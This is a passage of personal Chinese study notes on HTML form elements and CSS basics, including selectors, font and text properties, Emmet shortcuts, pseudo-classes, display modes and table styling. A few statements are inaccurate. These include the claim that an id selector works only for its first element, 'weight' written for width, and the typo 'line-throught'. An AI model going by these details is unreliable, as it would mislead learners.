class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;button&quot;</span> value = <span class="hljs-string">&quot;获取验证码&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;file&quot;</span> &gt;<br><span class="hljs-keyword">file</span>加不了value。<br></code></pre></td></tr></table></figure><p>lable标签<br>lable用于绑定一个表单元素，当点击lable内的文本，浏览器会自动选择对应表单<br>语法:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> = <span class="hljs-string">&quot;sex&quot;</span>&gt;男&lt;/<span class="hljs-keyword">label</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;radio&quot;</span> name = <span class="hljs-string">&quot;sex&quot;</span> value = <span class="hljs-string">&quot;male&quot;</span> id = <span class="hljs-string">&quot;sex&quot;</span>/&gt;<br>核心：<br><span class="hljs-keyword">label</span>中的<span class="hljs-keyword">for</span>与表单元素中的id要相同。<br>不要写错<span class="hljs-keyword">label</span>！！！！<br></code></pre></td></tr></table></figure><p>select下拉表单元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">籍贯:<br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>o1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> = <span class="hljs-string">&quot;selected&quot;</span>&gt;</span>o2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>加selected会默认选中。<br></code></pre></td></tr></table></figure><p>textarea文本域表单元素：<br>如大量书写文字，个人简介120字。</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stan">&lt;textarea <span class="hljs-built_in">rows</span> = <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-built_in">cols</span> = <span class="hljs-string">&quot;20&quot;</span>&gt;<br>&lt;/textarea&gt;<br><span class="hljs-built_in">rows</span>与<span class="hljs-built_in">cols</span>基本上不使用，以后用css改<br></code></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>css是网页的美容师<br>html的局限性：只关注内容的语义，<strong>丑</strong></p><h4 id="css语法规范"><a href="#css语法规范" class="headerlink" title="css语法规范"></a>css语法规范</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>测试案例<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    you<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>于<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>标签内加入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css">标签，于style内，格式为</span><br><span class="language-css">目标 &#123;属性:属性值;&#125;记得分号结尾</span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span> : <span class="hljs-number">12px</span>;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>根据不同需求选出不同标签<br>基础选择器：</p><h5 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h5><p>以标签名作为选择器</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><p>可单独选择一个，或某几个标签。<br>先定义类，再将元素拉入类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.red</span> &#123;</span><br><span class="language-css"> <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span> = <span class="hljs-string">&quot;red&quot;</span>&gt;</span>红色<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>定义类：<code>.</code>+类名<br>调用类：标签内加入class = “类名”<br>长类名用<code>-</code>短横线链接<code>.star-st</code></p><h5 id="多类名"><a href="#多类名" class="headerlink" title="多类名"></a>多类名</h5><p>可以在class属性中写多个类名<br>必须用空格隔开！</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span> = &quot;<span class="hljs-symbol">red</span> <span class="hljs-symbol">green</span>&quot;&gt;&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h5><p>html元素用id属性来调用，style中用#定义</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#pink &#123;</span><br>    color : pink;<br>&#125;<br>...<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;pink&quot;</span>&gt;michell&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>与类选择器的区别：<br><strong>只能被调用一次</strong>，被第一个调用者成功调用后，无法再次被调用。</p><h5 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h5><p>用<code>*</code>定义，它会选取页面中所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符选择器不需要调用，自动给所有元素使用指定的样式。</p><h4 id="CSS字体"><a href="#CSS字体" class="headerlink" title="CSS字体"></a>CSS字体</h4><p>字体系列</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Microsoft YaHei&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体粗细</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-weight</span>: normal;<br>&#125;<br>有以下几个参数<br>bold：粗体 number ：<span class="hljs-number">700</span>；<br>bolder：更粗<br>lighter：细体<br>number：加数字，<span class="hljs-number">700</span>是加粗，<span class="hljs-number">400</span>是正常<br><span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;<br></code></pre></td></tr></table></figure><p>文字样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-style</span>: normal;<br>&#125;<br>italic:斜体<br></code></pre></td></tr></table></figure><p>字体复合属性</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">body&#123;<br>    <span class="hljs-keyword">font</span>: <span class="hljs-keyword">font</span>-style <span class="hljs-keyword">font</span>-weight <span class="hljs-keyword">font</span>-size/<span class="hljs-keyword">line</span>-height <span class="hljs-keyword">font</span>-family<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">font</span>: italic <span class="hljs-number">700</span> <span class="hljs-number">16</span>px/<span class="hljs-number">20</span>px(<span class="hljs-number">20</span>px可不写) <span class="hljs-string">&#x27;microsoft yahei&#x27;</span><span class="hljs-comment">;</span><br>    不能更改顺序<br>    只有size和family不能省略，其余部分省略则取默认值。<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h4><p><strong>文本颜色</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以是16进制如：<br>#ff0000；<br>或rgb(255,0,0)；</p><p><strong>文本对齐</strong><br>text-align用于设置元素内文本内容的水平对齐方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-align</span> : left(默认值);<br>&#125;<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(默认左对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(右对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">center</span><span class="hljs-params">(居中对齐)</span></span><br></code></pre></td></tr></table></figure><p><strong>装饰文本</strong><br>text-decoration属性规定添加到文本的修饰。可以添加下划线，删除线，上划线。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-decoration</span>: underline;<br>&#125;<br><span class="hljs-attribute">none</span>默认<br>underline下划线<br>line-throught删除线<br>overline上划线<br></code></pre></td></tr></table></figure><p>取消链接的下划线：<br>a{<br>    text-decoration: none;<br>}<br><strong>文本缩进</strong><br>text-indent属性用于指定文本第一行的缩进。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">10px</span>;<br>&#125;<br>只缩进首行！<br></code></pre></td></tr></table></figure><p>或使用em：当前元素一个文字的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>行间距</strong><br>line-height属性用于设置行间的距离。<br>行间距由文本高度，上间距，下间距三者构成。<br>改变的是上、下间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CSS的引入方式"><a href="#CSS的引入方式" class="headerlink" title="CSS的引入方式"></a>CSS的引入方式</h4><p>按照css书写位置不同，css可以分为三大类<br><strong>内部样式表</strong><br>全部写入style标签内部<br>理论上&lt;style&gt;可以放在任意处，但一般放在head内<br>是嵌入式引用。<br><strong>行内样式表</strong><br>简单的修改：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> style = <span class="hljs-string">&quot;color : pink;&quot;</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>单个的，简单的修改。<br><strong>外部样式表</strong><br>样式单独写在style文件内，再进行调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">新建一个后缀名为.css的文件<br>在这个文件里面，直接写样式，不需要style标签<br>使用&lt;link&gt;标签引入到html文件里<br>&lt;link rel <span class="hljs-operator">=</span> <span class="hljs-string">&quot;stylesheet&quot;</span> href <span class="hljs-operator">=</span> <span class="hljs-string">&quot;style.css（css文件路径）&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h4><p>emmet语法使用缩写提高编写速度。<br>1.快速生成HTML结构语法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">div</span>+<span class="hljs-literal">tab</span><br><span class="hljs-keyword">div</span>*<span class="hljs-number">10</span>+<span class="hljs-literal">tab</span><br>ul&gt;li*<span class="hljs-number">3</span><br><span class="hljs-keyword">div</span>+p<br>p.one(类名) == &lt;p <span class="hljs-built_in">class</span> = <span class="hljs-string">&quot;one&quot;</span>&gt;&lt;/p&gt;<br>p<span class="hljs-comment">#one(类名) == &lt;p id = &quot;one&quot;&gt;&lt;/p&gt;</span><br>即.就是生成类为此类名的元素，<span class="hljs-comment">#同理</span><br>.demo$*<span class="hljs-number">5</span>会生成以demo1~demo5为类的<span class="hljs-number">5</span>个<span class="hljs-keyword">div</span><br><span class="hljs-keyword">div</span>&#123;测试&#125; == &lt;<span class="hljs-keyword">div</span>&gt;测试&lt;/<span class="hljs-keyword">div</span>&gt;<br>$是自增符号<br><span class="hljs-keyword">div</span>&#123;$&#125;*<span class="hljs-number">5</span> == &lt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-number">1</span>~<span class="hljs-number">5</span>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>2.emmet语法快速生成css样式</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tac</span> = text-align:center<span class="hljs-comment">;</span><br><span class="hljs-attr">w100</span> = weight: <span class="hljs-number">100</span>px<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.快速格式化代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">vscode直接右键，选格式化文档，会自动对齐所有代码<br></code></pre></td></tr></table></figure><h4 id="css复合选择器"><a href="#css复合选择器" class="headerlink" title="css复合选择器"></a>css复合选择器</h4><p><strong>后代选择器（重要）</strong><br>后代选择器<br>例如：我想把ol内的li全部定一个样式，而ul中不变</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ol</span> <span class="hljs-selector-tag">li</span>&#123;<br>    <span class="hljs-attribute">color</span>:pink;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span> 元素<span class="hljs-number">2</span>&#123;<br>    <span class="hljs-attribute">color</span>: pink;<br>&#125;<br>元素<span class="hljs-number">2</span>是元素<span class="hljs-number">1</span>后代。<br><span class="hljs-number">1</span>，<span class="hljs-number">2</span>之间用空格隔开<br>可以套很多层，但后者必须是前一个的后代<br>可以是任意基础选择器的组合<br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">a</span>&#123;<br><span class="hljs-attribute">color</span>: yellow;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子选择器</strong><br>子选择器只能选择某元素最近一级的子元素<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span>&gt;元素<span class="hljs-number">2</span>&#123;<br><span class="hljs-attribute">color</span>: red;<br>&#125;<br>即只选择元素<span class="hljs-number">1</span>内离近的<span class="hljs-number">2</span>的儿子，作为对象。<br></code></pre></td></tr></table></figure><p><strong>并集选择器</strong><br>并集选择器可以选择多组标签，同时为他们定义相同样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>: pink;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>伪类选择器</strong><br>伪类选择器书写最大的特点是用冒号<code>:</code>表示</p><p>链接伪类选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>  选择所有未访问过的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>&#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>   选择所有已被访问的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>&#123;<br>    <span class="hljs-attribute">color</span>: orange;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>   选择鼠标经过的那一个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>选择鼠标按下，但未弹起鼠标的那个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>&#123;<br>    <span class="hljs-attribute">color</span>: green;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">为保证链接系列生效，必须保证LVHA的顺序进行声明。<br>链接都有默认样式，必须用<span class="hljs-selector-tag">a</span>单独指定样式<br>开发中：<br><span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: grey;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br>即可<br></code></pre></td></tr></table></figure><p><strong>focus伪类选择器</strong><br>用于选取获得焦点的表单元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: pink;<br>&#125;<br>则获得光标的<span class="hljs-selector-tag">input</span>元素，背景会变为pink色。<br></code></pre></td></tr></table></figure><h4 id="元素的显示模式"><a href="#元素的显示模式" class="headerlink" title="元素的显示模式"></a>元素的显示模式</h4><p>元素显示模式就是元素（标签）以什么方式进行显示</p><p>如div独占一行，但一行可以放很多span</p><p>HTML元素一般分为块元素和行内元素两种类型。</p><p><strong>块元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>等等，都是块元素<br>特点：<br>霸道，独占一行<br>可以嵌套，成为容器<br>但<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>标签以及<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>系列标签主要存放文字，所以其中不能放块级元素<br>宽度默认是容器的100%<br></code></pre></td></tr></table></figure><p><strong>行内元素</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;,&lt;strong&gt;......<br>特点:<br>一行可以写多个，放在一行内显示<br>高、宽直接设置是无效的<br>默认宽度就是本身内容的宽度<br>行内元素内只能放文本或其他行内元素<br>注意：<br><span class="hljs-keyword">a</span>内不能放<span class="hljs-keyword">a</span><br><span class="hljs-keyword">a</span>内可以放块级元素。但给<span class="hljs-keyword">a</span>转换为块级模式最安全<br></code></pre></td></tr></table></figure><p><strong>行内块元素</strong><br>如img，input标签</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">特点：<br>一行内可以放多个此元素，中间会有空白空隙<br>此元素可以设置宽和高<br></code></pre></td></tr></table></figure><p><strong>元素显示模式的转换</strong><br>如：a链接增加其触发范围<br>转换为块元素:<br>display:block;<br>转换为行内元素：<br>display:inline;</p><p><strong>单行文字垂直居中</strong><br>小技巧：<br>让文字行高等于盒子的高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br></code></pre></td></tr></table></figure><h3 id="CSS3列表"><a href="#CSS3列表" class="headerlink" title="CSS3列表"></a>CSS3列表</h3><p>为ul、ol设置不同的列表项标记<br><code>list-style-type</code></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>.<span class="hljs-string">a</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">circle</span>;&#125;圆点状列表标记<br>.<span class="hljs-string">b</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">square</span>;&#125;方形列表标记<br><span class="hljs-string">none</span>就是无标记<br></code></pre></td></tr></table></figure><p>也可指定图像，进行标记</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS3表格美化"><a href="#CSS3表格美化" class="headerlink" title="CSS3表格美化"></a>CSS3表格美化</h3><p>表格边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br>此时会显示双边框，如果想只显示单边框<br><span class="hljs-attribute">border-collapse</span>: collapse;<br>即可<br></code></pre></td></tr></table></figure><p>表格高、宽、文字对齐</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">text-align</span>: right;水平方向对齐<br>    <span class="hljs-attribute">vertical-align</span>: 